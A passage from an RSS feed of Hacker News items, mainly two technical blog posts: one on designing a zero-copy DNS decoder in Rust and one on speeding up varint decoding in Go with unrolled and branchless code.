<span>impl</span><span>&lt;</span><span>I</span><span>:</span> <span>Read</span><span>&gt;</span> <span>Peek</span><span>&lt;</span><span>I</span><span>&gt;</span> <span>{</span>
    <span>pub</span> <span>fn</span> <span>peek</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>position</span><span>:</span> <span>usize</span><span>)</span> <span>-&gt;</span> <span>std</span><span>::</span><span>io</span><span>::</span><span>Result</span><span>&lt;&amp;</span><span>[</span><span>u8</span><span>]</span><span>&gt;</span> <span>{</span> <span>/* ... */</span> <span>}</span>
<span>}</span>
</code></pre></div>        </div>
      </div>
      <figcaption>
        <p>Note that many of the names of types and other symbols have been changed to make this post more clear and consistent. For example, <code>Rewind</code> was actually called <code>Elephant</code>(?!), and I actually flip-flopped between <code>View</code> and <code>Consume</code>.</p>
      </figcaption>
    </figure>

    

  </div>

  <div id="hg-v1">

    <p>This approach only made sense under the premise that we should be able to stream DNS messages from a <code>Read</code> into the decoder, a premise that I clung to because I thought we might not know how long a message is without decoding it.</p>

    <p>As it turns out, this isn’t actually a problem for DNS as used with its two most common transports.
For UDP, each datagram contains exactly one message, and datagrams are inherently of fixed length.
For TCP, streams can convey many messages, but the sender has to prefix each message with its length.</p>

    <p>With that cleared up, I decided that this kind of “streaming” decoder wasn’t worth the effort, and I went back to the drawing board.</p>

    <hr>

    <h3 id="zero-copy-views">Zero-copy views</h3>

    <p>While I was at the drawing board, I also started developing some ideas that would pave the way for zero-copy decoding.</p>

    <p>Looking back at the old <code>Header</code> design below, notice how we painstakingly unpack everything from each field into neat little Rust fields?
Each thing we unpack involves some copying that adds precious instructions to the critical path.</p>

    <figure>
      <div>
        <div><div><pre><code><span>pub</span> <span>struct</span> <span>Header</span> <span>{</span>
    <span>id</span><span>:</span> <span>u16</span><span>,</span>
    <span>qr</span><span>:</span> <span>bool</span><span>,</span>
    <span>opcode</span><span>:</span> <span>u8</span><span>,</span>
    <span>aa</span><span>:</span> <span>bool</span><span>,</span>
    <span>// ...</span>
<span>}</span>
</code></pre></div>        </div>
      </div>
    </figure>

    <p>What if we could walk through a DNS message as quickly as possible, doing only the work that’s absolutely necessary to reach the end of the message?
This turns out to be an interesting problem to solve, because most of the message is of <strong>unknown length</strong>.
A protocol element of unknown length means that its length can only be known by descending into, and walking through, that protocol element.</p>

    <p>This is distinct from other elements of <strong>variable length</strong>, where the length can be determined from surrounding information, but don’t worry about this just yet.
Let’s consider this overview of DNS protocol elements.
Walking through the header is easy — skip 12 octets — but the rest of the message is of unknown length.</p>

    <figure>
<p><img src="https://www.azabani.com/images/nonymous-bore-message0.svg"></p>
</figure>

    <p>This is because each section is of unknown length.
Even if questions and records were of known but variable length, there’s a variable number of them in each section.</p>

    <figure>
<p><img src="https://www.azabani.com/images/nonymous-bore-message1.svg"></p>
</figure>

    <p>To make matters worse, questions and records themselves are of unknown length anyway.
Notice that rdata is a good example of an element of known but variable length.</p>

    <figure>
<p><img src="https://www.azabani.com/images/nonymous-bore-message2.svg"></p>
</figure>

    <p>At the end of the day, the root cause is that names themselves are of unknown length.
While labels are of known but variable length, there’s a variable number of them in each name.
The length of a label depends on a couple of different things, and this has surprisingly interesting implications for extensibility<sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p>

    <figure>
<p><img src="https://www.azabani.com/images/nonymous-bore-message3.svg"></p>
</figure>

    <p>The crux of my approach to zero-copy decoding is that walking to the end of a message in this way is, on some level, proof that the message is structurally sound.
When that proof succeeds, we want to return some type that represents the proof.
This is what I call a <strong>view</strong>, and it allows the caller to interrogate the message <em>efficiently</em>, because many of their “questions” can be made infallible<sup id="fnref:2"><a href="#fn:2">2</a></sup>, and <em>confidently</em>, because we’ve proven that those infallible “questions” are truly infallible (panic-free).</p>

    <p>A view under this definition can be a unit type (no fields), but in practice, we should also include any information that the caller can use to answer their “questions” <em>even more</em> efficiently.
To keep our design embedded-friendly, let’s avoid the need for a separate allocation by limiting ourselves to constant space.</p>

    <p>For records, that’s easy enough: one slice over the whole message (for compressed names), plus where the record starts in the message, and where the fixed part starts, or equivalent.</p>

    <figure>
<p><img src="https://www.azabani.com/images/nonymous-bore-record.svg"></p>
</figure>

    <figure>
      <div>
        <div>
          <div><div><pre><code><span>pub</span> <span>struct</span> <span>Record</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>{</span>
    <span>start</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
    <span>name</span><span>:</span> <span>Name</span><span>&lt;</span><span>'s</span><span>&gt;</span><span>,</span>
    <span>rest</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
<span>}</span>
</code></pre></div>          </div>
          
          <div><div><pre><code><span>pub</span> <span>struct</span> <span>Name</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>{</span>
    <span>start</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
    <span>slice</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
<span>}</span>
</code></pre></div>          </div>
        </div>
      </div>
    </figure>

    <p>As for messages, I think the most useful information we can return in constant space is a slice over the whole message, plus slices indicating where each section starts, to give question and record iterators what they need to know to start immediately.</p>

    <figure>
      <div>
        <div>
          <div><div><pre><code><span>pub</span> <span>struct</span> <span>Message</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>{</span>
    <span>start</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
    <span>header</span><span>:</span> <span>Header</span><span>&lt;</span><span>'s</span><span>&gt;</span><span>,</span>
    <span>qd</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
    <span>an</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
    <span>ns</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
    <span>ar</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
<span>}</span>
</code></pre></div>          </div>
          
          <div><div><pre><code><span>pub</span> <span>struct</span> <span>Header</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>{</span>
    <span>start</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
    <span>slice</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
<span>}</span>
</code></pre></div>          </div>
        </div>
      </div>
    </figure>

    <p>If we require the caller to provide the whole message upfront, we can dispense with all of that <code>Read</code> goop and ask for two slices (<code>&amp;[u8]</code>): one with the part of the message that this decoder should focus on, and one over the whole message for compressed names.</p>

    <figure>
      <div>
        <div><div><pre><code><span>// Ok((the view, slice over the remaining input))</span>
<span>pub</span> <span>type</span> <span>ViewResult</span><span>&lt;</span><span>'s</span><span>,</span> <span>T</span><span>&gt;</span> <span>=</span> <span>Result</span><span>&lt;</span><span>(</span><span>T</span><span>,</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>]),</span> <span>()</span><span>&gt;</span><span>;</span>

<span>pub</span> <span>trait</span> <span>View</span><span>&lt;</span><span>'s</span><span>&gt;</span><span>:</span> <span>Sized</span> <span>{</span>
    <span>fn</span> <span>view</span><span>(</span><span>start</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span> <span>source</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>])</span> <span>-&gt;</span> <span>ViewResult</span><span>&lt;</span><span>Self</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div>        </div>
      </div>
    </figure>

    <p>To speed up our decoding of compressed names, let’s cache the set of pointer destinations that are known to be good.</p>

    <!-- for ~~*secure* message decompression, in the face of pointers that form a cycle.~~
These malformed pointers pose a serious denial-of-service risk that we’ve known about for [over] [twenty] [years].
The most obvious way to mitigate this is to remember which pointer destinations we’ve already jumped to while decoding an individual name, then bail out if we’ve been asked to jump to the same place twice.

[over]: https://www.kb.cert.org/vuls/id/23495/
[twenty]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0333
[years]: https://nvd.nist.gov/vuln/detail/CVE-2000-0333 -->

    <figure>
      <div>
        <div><div><pre><code><span>pub</span> <span>struct</span> <span>Context</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>{</span>
    <span>start</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
    <span>cache</span><span>:</span> <span>Seen</span><span>,</span>
<span>}</span>

<span>pub</span> <span>trait</span> <span>View</span><span>&lt;</span><span>'s</span><span>&gt;</span><span>:</span> <span>Sized</span> <span>{</span>
    <span>fn</span> <span>view</span><span>(</span><span>context</span><span>:</span> <span>Context</span><span>&lt;</span><span>'s</span><span>&gt;</span><span>,</span> <span>source</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>])</span> <span>-&gt;</span> <span>ViewResult</span><span>&lt;</span><span>Self</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div>        </div>
      </div>
      <figcaption>
        <p>Note that this version actually used a type called <code>Slice</code>, but unlike the one in <a href="#hg-v2"><code>hg-v2</code></a>, it was just an alias for <code>&amp;[u8]</code>.</p>
      </figcaption>
    </figure>

    

  </div>

  <div id="hg-v2">

    <p>Now let’s add some error handling, and while we’re at it, replace <code>start</code> and <code>source</code> with a single type that represents a subslice that maintains a reference to the whole slice.</p>

    <figure>
      <div>
        <div><div><pre><code><span>pub</span> <span>struct</span> <span>Slice</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>{</span>
    <span>// rust-lang/rust#27186</span>
    <span>start</span><span>:</span> <span>usize</span><span>,</span>
    <span>stop</span><span>:</span> <span>usize</span><span>,</span>
    <span>whole</span><span>:</span> <span>&amp;</span><span>'s</span> <span>[</span><span>u8</span><span>],</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>Slice</span><span>&lt;</span><span>'s</span><span>&gt;</span> <span>{</span>
    <span>// TODO replace once slice_index_methods is stable</span>
    <span>fn</span> <span>slice</span><span>&lt;</span><span>R</span><span>:</span> <span>RangeBounds</span><span>&lt;</span><span>usize</span><span>&gt;&gt;</span><span>(</span><span>self</span><span>,</span> <span>range</span><span>:</span> <span>R</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span> <span>/* ... */</span> <span>}</span>

    <span>// ([p..q], len ≤ q-p) -&gt; ([p..p+len], [p+len..q])</span>
    <span>pub</span> <span>fn</span> <span>assert</span><span>(</span><span>self</span><span>,</span> <span>len</span><span>:</span> <span>usize</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(</span><span>Self</span><span>,</span> <span>Self</span><span>),</span> <span>SliceError</span><span>&gt;</span> <span>{</span> <span>/* ... */</span> <span>}</span>

    <span>// ([p..q], offset) -&gt; [offset..]</span>
    <span>pub</span> <span>fn</span> <span>jump</span><span>(</span><span>self</span><span>,</span> <span>offset</span><span>:</span> <span>usize</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Self</span><span>,</span> <span>SliceError</span><span>&gt;</span> <span>{</span> <span>/* ... */</span> <span>}</span>
<span>}</span>

<span>pub</span> <span>type</span> <span>ViewResult</span><span>&lt;</span><span>'s</span><span>,</span> <span>T</span><span>&gt;</span> <span>=</span> <span>Result</span><span>&lt;</span><span>(</span><span>T</span><span>,</span> <span>Slice</span><span>&lt;</span><span>'s</span><span>&gt;</span>…</code></pre></div></div></div></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.azabani.com/2021/01/03/nonymous-bore.html">https://www.azabani.com/2021/01/03/nonymous-bore.html</a></em></p>]]>
            </description>
            <link>https://www.azabani.com/2021/01/03/nonymous-bore.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25692447</guid>
            <pubDate>Fri, 08 Jan 2021 23:43:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Athens Joins Y Combinator]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25691977">thread link</a>) | @grzm
<br/>
January 8, 2021 | https://www.notion.so/Athens-Joins-Y-Combinator-86b9dfa30f4141e5bf072fad8f95a6c7 | <a href="https://web.archive.org/web/*/https://www.notion.so/Athens-Joins-Y-Combinator-86b9dfa30f4141e5bf072fad8f95a6c7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Athens-Joins-Y-Combinator-86b9dfa30f4141e5bf072fad8f95a6c7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25691977</guid>
            <pubDate>Fri, 08 Jan 2021 23:25:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimized Decoding of Google's varint format in Golang]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25691701">thread link</a>) | @bheni
<br/>
January 8, 2021 | https://www.dolthub.com/blog/2021-01-08-optimizing-varint-decoding/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2021-01-08-optimizing-varint-decoding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text">
<p><a href="https://doltdb.com/">Dolt</a> stores data in a <a href="https://www.dolthub.com/blog/2020-06-16-efficient-diff-on-prolly-trees/">content addressable prolly tree</a>
in order to get efficient merges and diffs. In designing the table data format one of our goals was to make table column additions and
deletions fast operations. They should not require a full table rewrite, the diff of rows with different schemas should show the
data changes and not be obfuscated by the schema changes, and diffs and merges should be efficient across states with different
schemas.  </p>
<p>With those goals in mind we store table data within the prolly tree as a map from a key tuple to a value tuple, and every
value within a tuple in <a href="https://doltdb.com/">Dolt</a> has a column identifier which we call a "tag", which is a simple unsigned integer. When the schema for a
table changes, none of the tuples are touched.  If a column is deleted, then the tag and value associated with that column
will be removed the next time the row is written, and when a row is read containing a value associated with a deleted column
the data is ignored.  </p>
<p>We achieved all of our goals with this design, but one consequence of this is that, at a bare minimum, half the values we
deserialize from the prolly tree are unsigned integers which are serialized using the
<a href="https://developers.google.com/protocol-buffers/docs/encoding#varints">Google varint format</a>. </p>

<p>In working on performance, I have profiled a lot of different operations.  Though never a huge portion of execution time,
<code>bytes.Uvarint()</code> kept showing up taking a much larger percentage of execution time than I would have expected.</p>
<div data-language="go"><pre><code>







<span>func</span> <span>Uvarint</span><span>(</span>buf <span>[</span><span>]</span><span>byte</span><span>)</span> <span>(</span><span>uint64</span><span>,</span> <span>int</span><span>)</span> <span>{</span>
    <span>var</span> x <span>uint64</span>
    <span>var</span> s <span>uint</span>
    <span>for</span> i<span>,</span> b <span>:=</span> <span>range</span> buf <span>{</span>
        <span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
            <span>if</span> i <span>&gt;</span> <span>9</span> <span>||</span> i <span>==</span> <span>9</span> <span>&amp;&amp;</span> b <span>&gt;</span> <span>1</span> <span>{</span>
                <span>return</span> <span>0</span><span>,</span> <span>-</span><span>(</span>i <span>+</span> <span>1</span><span>)</span> 
            <span>}</span>
            <span>return</span> x <span>|</span> <span>uint64</span><span>(</span>b<span>)</span><span>&lt;&lt;</span>s<span>,</span> i <span>+</span> <span>1</span>
        <span>}</span>
        x <span>|=</span> <span>uint64</span><span>(</span>b<span>&amp;</span><span>0x7f</span><span>)</span> <span>&lt;&lt;</span> s
        s <span>+=</span> <span>7</span>
    <span>}</span>
    <span>return</span> <span>0</span><span>,</span> <span>0</span>
<span>}</span></code></pre></div>
<p>The function is pretty simple.  For every byte take the low 7 bits and shift them to the next location and bitwise or them
on to the result that is being accumulated.  If the current byte has the highest order bit set, then continue on to the next byte
if not then return the accumulated result, and the number of bytes that were used in decoding.</p>
<p>So why is it slow? It is very "branchy".  For every iteration there are 2 branching conditions, and a 3rd branching condition on the final byte.
<a href="https://medium.com/swlh/branch-prediction-everything-you-need-to-know-da13ce05787e">This can wreak havok on the instruction execution pipeline</a>.</p>

<p>In trying to find a faster solution I tried searching for faster existing implementations, unrolling the loop for the existing
implementation, and writing a branchless implementation.  What follows is discussion of each optimization, how I benchmarked them
against eachother, and analysis of the results.</p>
<h2>Existing Implementations</h2>
<p>The first thing I did was search for existing implementations that purported to be faster than <code>bytes.Uvarint</code>. The only
one I found written in golang was <a href="https://github.com/dennwc/varint">https://github.com/dennwc/varint</a>. It advertises
that it is 30% to 50% faster depending on the number of bytes it's decoding.</p>
<h2>Unrolling the Loop</h2>
<p><a href="https://en.wikipedia.org/wiki/Loop_unrolling">Loop unrolling</a> eliminates branching conditions by duplicating logic.
Modern day compilers are very good, and often times will unroll simple loops to eliminate branching conditions however the
go compiler chooses not to.  Take the code:</p>
<div data-language="go"><pre><code><span>func</span> <span>LoopUnrollTest</span><span>(</span><span>)</span> <span>int</span> <span>{</span>
	<span>var</span> count <span>int</span>
	<span>for</span> i <span>:=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>1</span><span>;</span> i<span>++</span> <span>{</span>
		count<span>++</span>
	<span>}</span>

	<span>return</span> count
<span>}</span></code></pre></div>
<p>this for loop runs the code inside exactly one time.  Yet the generated assembly does not optimize out the comparison,
and the jump instruction.</p>
<div data-language="text"><pre><code>    0x0000 00000 (temp.go:3)    TEXT        "".LoopUnrollTest(SB), NOSPLIT|ABIInternal, $0-8
    0x0000 00000 (temp.go:3)    FUNCDATA    $0, gclocals·33cdeccccebe80329f1fdbee7f5874cb(SB)
    0x0000 00000 (temp.go:3)    FUNCDATA    $1, gclocals·33cdeccccebe80329f1fdbee7f5874cb(SB)
    0x0000 00000 (temp.go:3)    XORL        AX, AX
    0x0002 00002 (temp.go:5)    JMP         7
    0x0004 00004 (temp.go:6)    INCQ        AX
    0x0007 00007 (temp.go:5)    CMPQ        AX, $1
    0x000b 00011 (temp.go:5)    JLT         4
    0x000d 00013 (temp.go:9)    MOVQ        AX, "".~r0+8(SP)
    0x0012 00018 (temp.go:9)    RET</code></pre></div>
<p>I tried many variations, and as far as I can tell the go compiler never unrolls loops.</p>
<p>As is bytes.Uvarint cannot be unrolled as it checks against the length of buf at the end of every loop iteration and only exits when it reaches the end of
buf or when it finds a byte that does not have the most significant bit set.  I find this behavior odd.  If the size of buf is
64K and every byte was set to 0xFF it would iterate over all 64K values before returning <code>0, 0</code>.  Any 64-bit number can be encoded
in 10 bytes, and anything more than that will overflow. The goals that resulted in this implementation may not match my goals exactly,
and I can improve performance by diverging from them here because Dolt is only ever decoding values that it wrote, I don't
need to worry that somebody encoded a 512-bit varint which I need to skip gracefully.  I'm fine to fail after 10 bytes saying it's too
big, and have the caller handle that case as corrupt.  I'm also fine handling out of bounds errors externally as data corruption.</p>
<div data-language="go"><pre><code><span>func</span> <span>unrolledDecodeUVarint</span><span>(</span>buf <span>[</span><span>]</span><span>byte</span><span>)</span> <span>(</span><span>uint64</span><span>,</span> <span>int</span><span>)</span> <span>{</span>
	b <span>:=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>0</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> b<span>,</span> <span>1</span>
	<span>}</span>

	x <span>:=</span> b <span>&amp;</span> <span>0x7f</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>1</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>7</span><span>)</span><span>,</span> <span>2</span>
	<span>}</span>

	x <span>|=</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>7</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>2</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>14</span><span>)</span><span>,</span> <span>3</span>
	<span>}</span>

	x <span>|=</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>14</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>3</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>21</span><span>)</span><span>,</span> <span>4</span>
	<span>}</span>

	x <span>|=</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>21</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>4</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>28</span><span>)</span><span>,</span> <span>5</span>
	<span>}</span>

	x <span>|=</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>28</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>5</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>35</span><span>)</span><span>,</span> <span>6</span>
	<span>}</span>

	x <span>|=</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>35</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>6</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>42</span><span>)</span><span>,</span> <span>7</span>
	<span>}</span>

	x <span>|=</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>42</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>7</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>49</span><span>)</span><span>,</span> <span>8</span>
	<span>}</span>

	x <span>|=</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>49</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>8</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>56</span><span>)</span><span>,</span> <span>9</span>
	<span>}</span>

	x <span>|=</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>56</span>
	b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>9</span><span>]</span><span>)</span>
	<span>if</span> b <span>&lt;</span> <span>0x80</span> <span>{</span>
		<span>return</span> x <span>|</span> <span>(</span>b <span>&lt;&lt;</span> <span>63</span><span>)</span><span>,</span> <span>10</span>
	<span>}</span>

	<span>return</span> <span>0</span><span>,</span> <span>-</span><span>10</span>
<span>}</span></code></pre></div>
<p>It's not pretty, but it eliminates a branch condition for every byte, it eliminates the need to accumulate a count of decoded
byte, and it eliminates the need to track the the number of bits that need to be shifted.  As soon as it encounters a value
that can't be encoded in 64 bits it returns -10 (because it looked at 10 bytes and could see it would overflow at that point,
and the spec expects a negative number at that point).</p>
<h2>Branchless Implementation</h2>
<p>I worked in console gaming when the Xbox 360 and PS3 released. Those machines had exceptionally poor performance when it
came to branching, and the pixel/vertex shaders may not have even supported it (If they did it was unusable because of how
slow it was). Rewriting code to be branchless often times resulted in huge gains. Branching is still slow, but not nearly
as slow as it used to be, but I wanted to see how a branchless implementation would perform out of pure curiousity.</p>
<div data-language="go"><pre><code><span>func</span> <span>varuintNoBranch</span><span>(</span>buf <span>[</span><span>]</span><span>byte</span><span>)</span> <span>(</span><span>uint64</span><span>,</span> <span>int</span><span>)</span> <span>{</span>
    count <span>:=</span> <span>uint64</span><span>(</span><span>1</span><span>)</span>
    more <span>:=</span> <span>uint64</span><span>(</span><span>1</span><span>)</span>

    b <span>:=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>0</span><span>]</span><span>)</span>
    x <span>:=</span> more <span>*</span> <span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>1</span><span>]</span><span>)</span>
    x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>7</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>2</span><span>]</span><span>)</span>
    x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>14</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>3</span><span>]</span><span>)</span>
    x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>21</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>4</span><span>]</span><span>)</span>
    x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>28</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>5</span><span>]</span><span>)</span>
    x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>35</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>6</span><span>]</span><span>)</span>
    x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>42</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>7</span><span>]</span><span>)</span>
    x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>49</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>8</span><span>]</span><span>)</span>
    x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> <span>56</span><span>)</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    count <span>+=</span> more
    b <span>=</span> <span>uint64</span><span>(</span>buf<span>[</span><span>9</span><span>]</span><span>)</span>
    x <span>|=</span> <span>(</span>more <span>&amp;</span> b <span>&amp;</span> <span>0x1</span><span>)</span> <span>&lt;&lt;</span> <span>63</span>
    more <span>&amp;=</span> <span>(</span>b <span>&amp;</span> <span>0x80</span><span>)</span> <span>&gt;&gt;</span> <span>7</span>

    retCount <span>:=</span> <span>int</span><span>(</span>count<span>)</span> <span>*</span> <span>(</span><span>-</span><span>2</span><span>*</span><span>int</span><span>(</span>more<span>)</span> <span>+</span> <span>1</span><span>)</span>
    <span>return</span> x<span>,</span> retCount
<span>}</span></code></pre></div>
<p>The trick here is to keep a boolean <code>more</code> stored as a uint where 1 is true, and 0 is false. It
is initially 1 and gets cleared when the top bit is not set.  Then by adding it to an int every loop you get a count of
the number of bytes read in decoding.  You can then use that bool as a part of a mathematical operation instead of using
an if statement.</p>
<div data-language="go"><pre><code><span>if</span> more <span>==</span> <span>1</span> <span>{</span>
	x <span>|=</span> <span>(</span>b<span>&amp;</span><span>0x7f</span><span>)</span> <span>&lt;&lt;</span> shift
<span>}</span></code></pre></div>
<p>is equivalent to:</p>
<div data-language="go"><pre><code>x <span>|=</span> more <span>*</span> <span>(</span><span>(</span>b <span>&amp;</span> <span>0x7f</span><span>)</span> <span>&lt;&lt;</span> shift<span>)</span></code></pre></div>

<p>When generating the test data I wanted an even distribution of data that would be decoded from buffers sizing from 1 to
